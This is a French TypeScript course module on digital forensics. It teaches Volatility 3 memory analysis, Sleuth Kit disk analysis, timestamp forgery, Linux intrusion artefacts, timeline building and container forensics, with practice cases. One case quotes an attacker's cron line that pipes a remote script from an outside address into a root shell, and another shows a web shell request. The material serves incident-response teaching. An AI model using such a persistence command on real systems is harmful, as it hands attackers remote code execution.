import type { CourseBody } from '../../types';
import { questions } from './questions';

export const body: CourseBody = {
  courseId: 'j-memoire-artefacts-linux',
  lesson: {
    intro:
      'Une fois les preuves préservées et acquises, il faut les faire parler. La mémoire vive montre ce qui tournait au moment de l’acquisition, y compris ce qui n’a jamais touché le disque ; le disque garde l’historique des fichiers, même supprimés ; les journaux et le réseau donnent le fil du temps. Ce cours présente les outils de référence de cette analyse (Volatility 3, The Sleuth Kit, Autopsy, FTK Imager) et les artefacts propres aux serveurs Linux, puis montre comment tout réunir dans une chronologie.',
    sections: [
      {
        id: 'memoire',
        title: 'Analyse mémoire avec Volatility 3',
        blocks: [
          { t: 'p', text: '**Volatility 3** reconstruit les structures du noyau à partir d’une image mémoire brute : processus, connexions, modules chargés, lignes de commande. Il s’appuie sur des **tables de symboles** propres à la version exacte du système analysé (fournies pour Windows, à générer pour un noyau Linux).' },
          { t: 'code', lang: 'bash', caption: 'Premiers plugins sur une image Windows', code: '# Processus tels que listés par le noyau (liste chaînée)\nvol -f poste12.raw windows.pslist\n\n# Recherche des structures de processus dans toute la mémoire\nvol -f poste12.raw windows.psscan\n\n# Arborescence, lignes de commande, connexions réseau\nvol -f poste12.raw windows.pstree\nvol -f poste12.raw windows.cmdline\nvol -f poste12.raw windows.netscan\n\n# Zones mémoire exécutables sans fichier associé (code injecté)\nvol -f poste12.raw windows.malfind' },
          {
            t: 'example',
            title: 'Un processus présent dans psscan mais absent de pslist',
            blocks: [
              { t: 'p', text: '`pslist` parcourt la liste chaînée des processus maintenue par le noyau ; `psscan` cherche les structures de processus dans toute la mémoire. Un processus visible par `psscan` et absent de `pslist` est soit **terminé** (sa structure subsiste en mémoire), soit **délié** de la liste par un rootkit pour se cacher. Les horodatages de fin et les connexions associées (`netscan`) permettent de trancher.' },
            ],
          },
          { t: 'def', term: 'Injection de code', text: 'Technique qui écrit du code dans l’espace mémoire d’un autre processus, souvent légitime, puis l’exécute. `malfind` signale les régions à la fois exécutables et non adossées à un fichier sur disque, souvent avec un en-tête d’exécutable visible.' },
          { t: 'callout', kind: 'warn', text: 'Les sorties de Volatility sont des **indices** à recouper : une région signalée par `malfind` peut être légitime (compilation à la volée de .NET ou de JavaScript). On extrait la zone, on calcule son empreinte et on l’analyse avant de conclure.' },
        ],
      },
      {
        id: 'disque',
        title: 'Image disque : The Sleuth Kit, Autopsy, FTK Imager',
        blocks: [
          { t: 'p', text: 'L’analyse se fait **toujours sur une copie** vérifiée par empreinte. **FTK Imager** sert à acquérir (formats brut ou E01), à vérifier les empreintes et à monter une image en lecture seule. **The Sleuth Kit** fournit des commandes qui lisent directement les structures du système de fichiers ; **Autopsy** en est l’interface graphique, avec recherche par mots-clés, galerie et chronologie.' },
          { t: 'code', lang: 'bash', caption: 'Parcours type avec The Sleuth Kit', code: '# 1. Table des partitions (repérer le décalage de départ, en secteurs)\nmmls serveur.dd\n\n# 2. Informations sur le système de fichiers de la partition qui commence au secteur 2048\nfsstat -o 2048 serveur.dd\n\n# 3. Liste récursive des fichiers ; les entrées supprimées sont marquées « * »\nfls -r -o 2048 serveur.dd\n\n# 4. Métadonnées puis contenu d’un fichier par son numéro d’inode\nistat -o 2048 serveur.dd 131090\nicat -o 2048 serveur.dd 131090 > extrait.bin' },
          { t: 'def', term: 'Inode', text: 'Structure qui décrit un fichier sur les systèmes de type Unix (ext4) : propriétaire, permissions, horodatages, emplacement des données. Le nom du fichier est stocké à part, dans le répertoire. Sur NTFS, le rôle équivalent est tenu par l’entrée de la **MFT**.' },
          { t: 'callout', kind: 'info', text: 'Un fichier supprimé n’est souvent que « délié » : son entrée est marquée libre, mais ses métadonnées et ses données restent sur le disque jusqu’à ce qu’elles soient réutilisées. `fls` et `icat` peuvent alors les récupérer.' },
        ],
      },
      {
        id: 'horodatages',
        title: 'Horodatages : NTFS, ext4 et falsification',
        blocks: [
          {
            t: 'table',
            head: ['Système', 'Horodatages', 'Particularité utile'],
            rows: [
              ['**NTFS**', 'Création, modification, accès, modification de l’entrée MFT — stockés **deux fois** : dans `$STANDARD_INFORMATION` et dans `$FILE_NAME`', '`$STANDARD_INFORMATION` se modifie avec une simple API ; `$FILE_NAME` est beaucoup plus difficile à changer'],
              ['**ext4**', '`atime` (accès), `mtime` (contenu), `ctime` (changement de métadonnées), `crtime` (création)', '`touch` peut modifier `atime` et `mtime`, mais met `ctime` à l’heure courante'],
            ],
          },
          { t: 'def', term: 'Falsification d’horodatage (timestomping)', text: 'Modification délibérée des dates d’un fichier pour le faire paraître ancien et le noyer parmi les fichiers système (MITRE ATT&CK T1070.006). Signes : sur NTFS, une date de création `$STANDARD_INFORMATION` antérieure à celle de `$FILE_NAME`, ou des fractions de seconde à zéro ; sur ext4, un `ctime` très postérieur au `mtime`.' },
          { t: 'callout', kind: 'warn', text: 'La date d’accès est peu fiable : sous Linux, l’option de montage `relatime` ne la met à jour que dans certains cas, et Windows peut ne pas la mettre à jour. On ne fonde jamais une conclusion sur un accès seul.' },
        ],
      },
      {
        id: 'linux',
        title: 'Artefacts d’une intrusion sur un serveur Linux',
        blocks: [
          {
            t: 'table',
            head: ['Question', 'Où regarder'],
            rows: [
              ['Qui s’est connecté, d’où ?', '`/var/log/auth.log` (Debian, Ubuntu) ou `/var/log/secure` (RHEL) ; `wtmp` (`last -f`), `btmp` (échecs, `lastb -f`) ; journal systemd'],
              ['Quelles commandes ?', '`~/.bash_history` de chaque compte (y compris root) ; journaux auditd s’ils existent'],
              ['Comment l’attaquant revient-il ?', 'Crontabs (`/etc/crontab`, `/etc/cron.d/`, `/var/spool/cron/`), unités systemd (`/etc/systemd/system/`, `~/.config/systemd/user/`), `~/.ssh/authorized_keys`, fichiers d’initialisation du shell, `/etc/ld.so.preload`'],
              ['Qu’a-t-il déposé ?', '`/tmp`, `/var/tmp`, `/dev/shm`, fichiers cachés (commençant par un point), binaires système modifiés (`debsums`, `rpm -Va`)'],
            ],
          },
          { t: 'code', lang: 'bash', caption: 'Lire les journaux d’une image montée en lecture seule', code: '# Journal systemd de l’image (et non celui de la station d’analyse)\njournalctl -D /mnt/image/var/log/journal --since "2026-10-02" -u ssh\n\n# Connexions enregistrées dans wtmp de l’image\nlast -f /mnt/image/var/log/wtmp' },
          { t: 'callout', kind: 'key', text: 'L’absence d’une trace est aussi une information : un `.bash_history` vide ou lié à `/dev/null`, un `wtmp` tronqué ou un trou dans le journal sont des indices d’effacement volontaire, à dater et à consigner.' },
        ],
      },
      {
        id: 'chronologie',
        title: 'Construire une chronologie multi-sources',
        blocks: [
          { t: 'p', text: 'La chronologie (timeline) est le livrable central d’une investigation : elle ordonne les événements de toutes les sources pour reconstituer ce qui s’est passé et dans quel ordre.' },
          { t: 'code', lang: 'bash', caption: 'Chronologie du système de fichiers avec The Sleuth Kit', code: '# Extraire les métadonnées de tous les fichiers au format « body »\nfls -r -m / -o 2048 serveur.dd > body.txt\n\n# Trier par date, au format CSV, sur la fenêtre de l’incident\nmactime -b body.txt -d 2026-10-01..2026-10-05 > chronologie.csv' },
          { t: 'list', items: ['**Normaliser les fuseaux horaires** : tout convertir en UTC et noter le fuseau de chaque source.', '**Vérifier la dérive des horloges** : un serveur non synchronisé décale toute sa chronologie.', 'Fusionner disque, journaux système, journaux applicatifs, pare-feu et réseau (Zeek, captures) ; les outils de « super-chronologie » comme plaso (log2timeline) automatisent cette fusion.', 'Partir d’un **point d’ancrage** fiable (alerte, connexion connue) et explorer avant et après.'] },
          { t: 'def', term: 'Point d’ancrage', text: 'Événement daté avec certitude, à partir duquel on oriente la recherche. Par exemple : la première connexion SSH réussie depuis l’adresse de l’attaquant, attestée à la fois par `auth.log` et par le pare-feu.' },
        ],
      },
      {
        id: 'conteneurs',
        title: 'Conteneurs, Kubernetes et machines virtuelles dans le cloud',
        blocks: [
          { t: 'p', text: 'Les serveurs modernes exécutent souvent des **conteneurs** ou vivent dans le **cloud**. Les principes de la forensique restent les mêmes (préserver, vérifier, dater, recouper), mais les traces sont plus éphémères : un conteneur supprimé emporte avec lui ses couches et, par défaut, ses journaux.' },
          {
            t: 'table',
            head: ['Environnement', 'Où se trouvent les traces', 'Précaution'],
            rows: [
              ['**Hôte Docker**', '`/var/lib/docker` (images, couches overlay2, volumes, journaux JSON de chaque conteneur) ; `docker inspect` (montages, privilèges, variables)', 'Capturer l’état d’un conteneur en cours **avant** de l’arrêter ou de le supprimer'],
              ['**Kubernetes**', 'Journal d’audit de l’API (qui a fait quoi), journaux des pods, événements du cluster, journaux des nœuds', 'Activer l’audit et exporter les journaux hors du cluster'],
              ['**Machine virtuelle cloud**', 'Instantané (snapshot) du volume, journaux de la plateforme (activité des comptes, appels d’API), journaux de flux réseau', 'Isoler par les règles réseau et faire un instantané plutôt que supprimer l’instance'],
              ['**Services managés**', 'Journaux d’audit du fournisseur, journaux d’accès aux objets de stockage', 'Vérifier la rétention proposée par le fournisseur et le modèle de responsabilité partagée'],
            ],
          },
          { t: 'code', lang: 'bash', caption: 'Préserver l’état d’un conteneur suspect avant intervention', code: '# Configuration complète : montages, privilèges, réseau, variables\ndocker inspect conteneur-web > inspect.json\n\n# Journaux du conteneur\ndocker logs --timestamps conteneur-web > logs.txt\n\n# Processus en cours dans le conteneur\ndocker top conteneur-web > top.txt\n\n# Copie du système de fichiers du conteneur\ndocker export conteneur-web -o conteneur-web.tar\n\n# Empreintes de tous les éléments collectés\nsha256sum inspect.json logs.txt top.txt conteneur-web.tar > empreintes.txt' },
          { t: 'list', items: ['**Privilèges** : un conteneur « privilégié » ou qui monte la socket du moteur donne un accès quasi complet à l’hôte : c’est un point à vérifier en priorité.', '**Éphémère** : les conteneurs sont recréés par l’orchestrateur ; sans journalisation externe, les traces s’effacent.', '**Compte cloud** : les journaux d’activité de la plateforme montrent les créations de ressources et les changements de droits.'] },
          { t: 'callout', kind: 'key', text: 'Dans le cloud et les conteneurs, la rétention des journaux se décide **avant** l’incident : un journal qui n’a pas été conservé ne peut pas être récupéré.' },
        ],
      },
      {
        id: 'integrite',
        title: 'Intégrité d’un système Linux et détection des modifications',
        blocks: [
          { t: 'p', text: 'Un attaquant qui prend le contrôle d’un serveur Linux modifie rarement le système au hasard : il remplace un binaire, ajoute un compte, charge une bibliothèque, installe une tâche. Comparer le système à un **état de référence** révèle ces changements.' },
          {
            t: 'table',
            head: ['Contrôle', 'Commande ou emplacement', 'Ce qu’il révèle'],
            rows: [
              ['Intégrité des paquets', '`debsums -c` (Debian, Ubuntu), `rpm -Va` (Red Hat)', 'Binaire ou bibliothèque système modifié ou remplacé'],
              ['Fichiers récents', '`find / -xdev -newermt "2026-10-02" ! -newermt "2026-10-04"`', 'Fichiers modifiés pendant la fenêtre d’incident'],
              ['Droits spéciaux', '`find / -perm -4000 -type f` (SUID)', 'Exécutable SUID ajouté, notamment dans un répertoire temporaire'],
              ['Comptes', '`/etc/passwd`, `/etc/shadow`, `/etc/sudoers.d/`', 'Compte ajouté, UID 0 supplémentaire, droits sudo accordés'],
              ['Chargement forcé', '`/etc/ld.so.preload`', 'Bibliothèque injectée dans tous les processus (technique de rootkit)'],
              ['Modules noyau', '`lsmod`, `/lib/modules/`', 'Module inconnu ou non signé'],
            ],
          },
          { t: 'def', term: 'Base d’intégrité', text: 'Instantané des empreintes et attributs des fichiers d’un système sain (par exemple avec AIDE), comparé régulièrement à l’état courant. Tout écart non expliqué est un indice. Elle doit être stockée hors du serveur pour ne pas être modifiée par un attaquant.' },
          { t: 'list', items: ['**Extraire, ne pas exécuter** : on copie le fichier suspect depuis l’image montée en lecture seule et on l’analyse dans un environnement isolé.', '**Comparer à la source** : on télécharge le paquet officiel de la même version et on compare les empreintes.', '**Dater** : `ctime` et `crtime` donnent la date réelle du changement, contrairement à `mtime` qu’on peut remettre à une date ancienne.', '**Rechercher en cascade** : un binaire modifié mène à la bibliothèque qui le charge, puis à la tâche qui le lance.'] },
          { t: 'callout', kind: 'warn', text: 'Un écart d’intégrité n’est pas toujours malveillant (fichier de configuration modifié par l’administrateur, mise à jour). Il se qualifie par le contexte et la date, jamais par la seule différence d’empreinte.' },
        ],
      },
    ],
    useCases: [
      'Investigation d’un serveur web Linux compromis : point d’entrée, commandes exécutées, persistance, données touchées.',
      'Recherche d’un malware sans fichier sur un poste Windows à partir d’une image mémoire.',
      'Expertise judiciaire : chronologie documentée et reproductible, chaque conclusion reliée à un artefact et à son empreinte.',
    ],
    commonMistakes: [
      'Monter une image en lecture-écriture ou analyser l’original au lieu de la copie.',
      'Lire les journaux de la station d’analyse au lieu de ceux de l’image (oublier `-D` ou `-f`).',
      'Mélanger heures locales et UTC dans la chronologie.',
      'Conclure à une compromission sur une seule sortie de `malfind`, sans recoupement.',
      'Se fier à la date d’accès d’un fichier ou à des horodatages `$STANDARD_INFORMATION` sans les comparer à `$FILE_NAME`.',
    ],
    bestPractices: [
      'Travailler sur une copie vérifiée par empreinte, montée en lecture seule.',
      'Consigner chaque commande, version d’outil et résultat (reproductibilité).',
      'Recouper chaque conclusion par au moins deux sources indépendantes.',
      'Convertir toutes les sources en UTC et mesurer la dérive des horloges.',
      'Rechercher systématiquement les mécanismes de persistance avant de déclarer un système nettoyé.',
    ],
    keyPoints: [
      '`pslist` suit la liste du noyau, `psscan` cherche dans toute la mémoire : un écart signale un processus terminé ou caché.',
      'The Sleuth Kit : `mmls`, `fls`, `istat`, `icat`, `mactime` ; Autopsy en est l’interface graphique.',
      'NTFS stocke les dates deux fois ; un écart entre `$SI` et `$FN` trahit la falsification.',
      'Linux : auth.log ou secure, wtmp, bash_history, cron, systemd, authorized_keys.',
      'Une chronologie fiable est en UTC, multi-sources et ancrée sur un événement certain.',
    ],
  },
  practice: [
    {
      id: 'memoire-poste',
      kind: 'analysis',
      title: 'Interpréter des sorties Volatility',
      context: [
        { t: 'p', text: 'Extraits d’une image mémoire d’un poste Windows :' },
        { t: 'code', lang: 'text', code: 'windows.pslist (extrait)\nPID   PPID  Nom              Création\n4120  3988  explorer.exe     2026-10-02 07:58:12\n6604  4120  OUTLOOK.EXE      2026-10-02 08:01:40\n\nwindows.psscan (extrait, en plus de ce qui précède)\n7216  6604  rundll32.exe     2026-10-02 09:12:03   (absent de pslist, pas d’heure de fin)\n\nwindows.netscan\n7216  rundll32.exe  10.1.4.31:50412 → 198.51.100.23:443  ESTABLISHED\n\nwindows.malfind\n7216  rundll32.exe  région 0x2a10000  PAGE_EXECUTE_READWRITE  en-tête « MZ »' },
      ],
      steps: ['Interpréter chaque observation.', 'Formuler une conclusion prudente et ce qui la renforcerait.', 'Indiquer les extractions à réaliser pour la suite de l’analyse.'],
    },
    {
      id: 'serveur-linux',
      kind: 'case',
      title: 'Cas pratique : chronologie d’un serveur Linux compromis',
      context: [
        { t: 'p', text: 'Image disque d’un serveur Ubuntu. Observations brutes :' },
        { t: 'code', lang: 'text', code: 'auth.log  : 2026-10-02 22:41:07 Accepted password for deploy from 203.0.113.50\nauth.log  : 2026-10-02 22:40:55 … 22:41:05  1 312 « Failed password for deploy » depuis 203.0.113.50\nwtmp      : aucune entrée entre 22:00 et 23:30\n/home/deploy/.bash_history : lien symbolique vers /dev/null, ctime 2026-10-02 22:43:10\n/etc/cron.d/sysupdate : créé (crtime) 2026-10-02 22:44:31, contenu : « */5 * * * * root curl -s http://203.0.113.50/u.sh | sh »\n/usr/lib/x86_64-linux-gnu/libkeyutils.so.9 : mtime 2021-03-14, ctime 2026-10-02 22:45:02' },
      ],
      steps: ['Construire la chronologie des faits en UTC (le serveur est en UTC).', 'Identifier le point d’entrée, la persistance et les tentatives de dissimulation.', 'Lister les vérifications et les mesures de remédiation.'],
    },
    {
      id: 'conteneur-compromis',
      kind: 'case',
      title: 'Cas pratique : un conteneur exposé est soupçonné d’être compromis',
      context: [
        { t: 'p', text: 'Une alerte signale des connexions sortantes inhabituelles depuis l’hôte `docker-prod-02`. Observations :' },
        { t: 'code', lang: 'text', code: 'docker ps : conteneur « web-api » (image registre-interne/web-api:4.2), démarré il y a 11 jours\ndocker inspect web-api : Privileged = true ; montage /var/run/docker.sock:/var/run/docker.sock\ndocker logs web-api (extrait) : « GET /health 200 » toutes les 30 s ; 2026-10-02 03:12:08 « POST /upload 200 » ; 03:12:41 « GET /uploads/x.php?c=… 200 »\ndocker diff web-api : A /var/www/uploads/x.php ; A /tmp/.cache/agent\nHôte : nouveau conteneur « agent-sync » créé à 03:20:15, image inconnue, réseau hôte\nJournal d’audit cloud : clé d’accès du compte « ci-deploy » utilisée à 03:27 depuis une adresse inconnue' },
      ],
      steps: ['Construire la chronologie et identifier le point d’entrée, l’élévation et la persistance.', 'Indiquer, dans l’ordre, ce que vous préservez avant toute action sur l’hôte et le conteneur.', 'Proposer le confinement, l’éradication et les mesures de durcissement.'],
    },
  ],
  questions,
  resources: [
    { title: 'Volatility 3 documentation', source: 'Volatility Foundation', url: 'https://volatility3.readthedocs.io/' },
    { title: 'The Sleuth Kit', source: 'Brian Carrier / Basis Technology', url: 'https://www.sleuthkit.org/sleuthkit/' },
    { title: 'Autopsy', source: 'Basis Technology', url: 'https://www.autopsy.com/' },
    { title: 'Guide to Integrating Forensic Techniques into Incident Response (SP 800-86)', source: 'NIST', url: 'https://csrc.nist.gov/pubs/sp/800/86/final' },
    { title: 'plaso (log2timeline)', source: 'Projet plaso', url: 'https://plaso.readthedocs.io/' },
  ],
};
